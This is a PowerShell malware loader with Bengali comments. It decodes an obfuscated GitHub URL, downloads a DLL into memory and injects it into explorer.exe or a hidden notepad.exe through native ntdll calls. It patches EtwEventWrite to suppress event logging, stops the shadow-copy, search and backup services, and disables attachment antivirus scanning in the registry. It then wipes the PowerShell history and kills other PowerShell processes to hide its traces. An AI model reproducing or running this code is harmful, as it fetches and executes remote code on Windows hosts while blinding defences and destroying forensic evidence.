# ================================================================
# main.ps1 – MEMORY-ONLY REFLECTIVE INJECTOR (NO DISK WRITE)
# রান: PowerShell এডমিন মোডে
# ================================================================

# ---- বেস৬৪ এনকোডেড DLL ইউআরএল ----
$urlEnc = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw="
$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($urlEnc))

# ---- সি# ইনলাইন কোড (Nt* সিসকল + ETW প্যাচ) ----
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class NtSys {
    [DllImport("ntdll.dll")]
    public static extern int NtAllocateVirtualMemory(
        IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits,
        ref IntPtr RegionSize, uint AllocationType, uint Protect);

    [DllImport("ntdll.dll")]
    public static extern int NtWriteVirtualMemory(
        IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer,
        uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    public static extern int NtProtectVirtualMemory(
        IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize,
        uint NewProtect, out uint OldProtect);

    [DllImport("ntdll.dll")]
    public static extern int NtCreateThreadEx(
        out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes,
        IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter,
        bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit,
        uint SizeOfStackReserve, IntPtr AttributeList);

    [DllImport("ntdll.dll")]
    public static extern int NtOpenProcess(
        out IntPtr ProcessHandle, uint DesiredAccess, IntPtr ObjectAttributes,
        ref ClientId ClientId);

    [DllImport("ntdll.dll")]
    public static extern int NtClose(IntPtr Handle);

    [StructLayout(LayoutKind.Sequential)]
    public struct ClientId {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    // ---- ETW প্যাচ (Event 4103 ব্লক) ----
    public static void PatchEtw() {
        IntPtr hNtdll = GetModuleHandleW("ntdll.dll");
        if (hNtdll == IntPtr.Zero) return;
        IntPtr pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
        if (pEtw == IntPtr.Zero) return;
        uint oldProtect;
        VirtualProtect(pEtw, 5, 0x40, out oldProtect);
        Marshal.WriteByte(pEtw, 0xC3); // RET
        VirtualProtect(pEtw, 5, oldProtect, out oldProtect);
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandleW(string lpModuleName);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

# ---- রেজিস্ট্রি টুইক + সার্ভিস স্টপ ----
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 -Force | Out-Null
Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "UltraViewService*" -Force -ErrorAction SilentlyContinue

$reg1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
$reg2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"
Invoke-Expression $reg1 | Out-Null
Invoke-Expression $reg2 | Out-Null
Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null

# ---- মেমোরিতে DLL ডাউনলোড (ডিস্কে কিছু না) ----
Write-Host "[+] Downloading DLL to memory..."
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$dllBytes = $wc.DownloadData($url)
$wc.Dispose()

if ($dllBytes.Length -lt 1024) {
    Write-Host "[!] DLL size too small. Exiting."
    Exit
}
Write-Host "[+] Downloaded $($dllBytes.Length) bytes."

# ---- টার্গেট প্রসেস (explorer.exe) ----
$procs = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
if (-not $procs) {
    Write-Host "[!] Explorer not found, spawning notepad.exe..."
    $target = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
    Start-Sleep -Milliseconds 500
    $pidTarget = $target.Id
} else {
    $pidTarget = $procs[0].Id
}
Write-Host "[+] Target PID: $pidTarget"

# ---- টার্গেট প্রসেস ওপেন (NtOpenProcess) ----
$clientId = New-Object NtSys+ClientId
$clientId.UniqueProcess = [IntPtr]$pidTarget
$clientId.UniqueThread = [IntPtr]0
$hProcess = [IntPtr]0
$status = [NtSys]::NtOpenProcess([ref]$hProcess, 0x1F0FFF, [IntPtr]0, [ref]$clientId)
if ($status -ne 0 -or $hProcess -eq [IntPtr]::Zero) {
    Write-Host "[!] NtOpenProcess failed. Status: $status"
    Exit
}
Write-Host "[+] Process opened: $hProcess"

# ---- মেমরি এলোকেট (RW) ----
$baseAddr = [IntPtr]0
$regionSize = [IntPtr]$dllBytes.Length
$status = [NtSys]::NtAllocateVirtualMemory($hProcess, [ref]$baseAddr, [IntPtr]0, [ref]$regionSize, 0x3000, 0x04)
if ($status -ne 0) {
    Write-Host "[!] Memory allocation failed. Status: $status"
    [NtSys]::NtClose($hProcess)
    Exit
}
Write-Host "[+] Memory allocated at: $baseAddr"

# ---- DLL রাইট ----
$bytesWritten = 0
$status = [NtSys]::NtWriteVirtualMemory($hProcess, $baseAddr, $dllBytes, [System.UInt32]$dllBytes.Length, [ref]$bytesWritten)
if ($status -ne 0 -or $bytesWritten -ne $dllBytes.Length) {
    Write-Host "[!] Write failed. Status: $status"
    [NtSys]::NtClose($hProcess)
    Exit
}
Write-Host "[+] $bytesWritten bytes written."

# ---- প্রোটেকশন পরিবর্তন (RW → RX) ----
$regionSize = [IntPtr]$dllBytes.Length
$oldProtect = 0
$status = [NtSys]::NtProtectVirtualMemory($hProcess, [ref]$baseAddr, [ref]$regionSize, 0x20, [ref]$oldProtect)
if ($status -ne 0) { Write-Host "[!] Protection change warning. Status: $status" }

# ---- PE হেডার থেকে EntryPoint RVA বের ----
$e_lfanew = [System.BitConverter]::ToInt32($dllBytes, 0x3C)
$entryRVA = [System.BitConverter]::ToInt32($dllBytes, $e_lfanew + 0x28)
$startAddr = [IntPtr]::Add($baseAddr, $entryRVA)
Write-Host "[+] EntryPoint RVA: 0x$($entryRVA.ToString('X'))"

# ---- থ্রেড ক্রিয়েট (NtCreateThreadEx) ----
$hThread = [IntPtr]0
$status = [NtSys]::NtCreateThreadEx([ref]$hThread, 0x1FFFFF, [IntPtr]0, $hProcess, $startAddr, [IntPtr]0, $false, 0, 0, 0, [IntPtr]0)
if ($status -ne 0) {
    Write-Host "[!] Thread creation failed. Status: $status"
    [NtSys]::NtClose($hProcess)
    Exit
}
Write-Host "[+] Thread created successfully."

# ---- ETW প্যাচ (নিশ্চিত) ----
[NtSys]::PatchEtw()

# ---- ক্লিনআপ ----
[NtSys]::NtClose($hThread)
[NtSys]::NtClose($hProcess)

# ---- হিস্ট্রি ক্লিয়ার ----
Clear-History
$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (Test-Path $historyPath) { Remove-Item $historyPath -Force -ErrorAction SilentlyContinue }
New-Item -Path $historyPath -ItemType File -Force -ErrorAction SilentlyContinue | Out-Null

# ---- অন্যান্য পাওয়ারশেল প্রসেস কিল ----
Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue
Get-Process -Name "conhost" -ErrorAction SilentlyContinue | ForEach-Object {
    if ($_.Parent.Id -ne $PID) { Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue }
}

Write-Host "[+] Injection complete! DLL is running in memory. No disk write, no Defender block."
